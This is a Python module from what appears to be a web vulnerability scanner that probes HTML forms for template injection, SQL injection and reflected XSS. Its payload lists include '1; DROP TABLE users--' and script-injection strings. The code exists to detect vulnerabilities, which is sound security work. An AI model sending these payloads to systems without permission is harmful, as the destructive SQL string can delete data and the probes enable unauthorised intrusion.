import httpx
import random


def _make_ssti_payload() -> list:
    a = random.randint(1000, 9999)
    b = random.randint(1000, 9999)
    expected = str(a * b)
    return [
        (f"{{{{{a}*{b}}}}}", expected),
        (f"${{{a}*{b}}}",    expected),
        (f"<%= {a}*{b} %>",  expected),
    ]


SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "1; DROP TABLE users--"]
XSS_PAYLOADS  = ["<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>"]
SQLI_ERRORS   = [
    "sql syntax", "mysql_fetch", "unclosed quotation",
    "pg_query", "sqlite3", "ora-", "syntax error",
]


def _dedup(findings: list) -> list:
    seen = set()
    result = []
    for f in findings:
        key = (f.get("type"), f.get("url"), f.get("detail", "")[:60])
        if key not in seen:
            seen.add(key)
            result.append(f)
    return result


async def test_form(form: dict, session: httpx.AsyncClient) -> list:
    findings = []
    action = form.get("action", "")
    method = form.get("method", "GET")
    inputs = form.get("inputs", [])

    if not action or not inputs:
        return findings

    base_data = {
        inp["name"]: inp.get("value", "test")
        for inp in inputs if inp.get("name")
    }

    if not base_data:
        return findings

    for template_str, expected in _make_ssti_payload():
        data = {k: template_str for k in base_data}
        try:
            r = await (session.post(action, data=data) if method == "POST"
                       else session.get(action, params=data))
            body = r.text
            result_present  = expected in body
            input_reflected = template_str in body

            if result_present and not input_reflected:
                findings.append({
                    "type": "SSTI", "severity": "CRITICAL",
                    "confidence": "HIGH", "url": action,
                    "detail": f"Evaluated {template_str}={expected}. Manual verification required.",
                })
            elif result_present and input_reflected:
                findings.append({
                    "type": "POTENTIAL_SSTI", "severity": "HIGH",
                    "confidence": "LOW", "url": action,
                    "detail": f"Result {expected} found but input also reflected — likely false positive.",
                })
        except Exception:
            pass

    for payload in SQLI_PAYLOADS:
        data = {k: payload for k in base_data}
        try:
            r = await (session.post(action, data=data) if method == "POST"
                       else session.get(action, params=data))
            body = r.text.lower()
            for err in SQLI_ERRORS:
                if err in body:
                    findings.append({
                        "type": "SQLI_ERROR_BASED", "severity": "CRITICAL",
                        "confidence": "HIGH", "url": action,
                        "detail": f"SQL error '{err}' with payload: {payload}",
                    })
                    break
        except Exception:
            pass

    for payload in XSS_PAYLOADS:
        data = {k: payload for k in base_data}
        try:
            r = await (session.post(action, data=data) if method == "POST"
                       else session.get(action, params=data))
            if payload in r.text:
                findings.append({
                    "type": "XSS_REFLECTED", "severity": "HIGH",
                    "confidence": "HIGH", "url": action,
                    "detail": f"Payload reflected unencoded: {payload}",
                })
        except Exception:
            pass

    return findings


async def run_injection_tests(forms: list, session: httpx.AsyncClient) -> list:
    all_findings = []
    for form in forms:
        all_findings.extend(await test_form(form, session))
    return _dedup(all_findings)
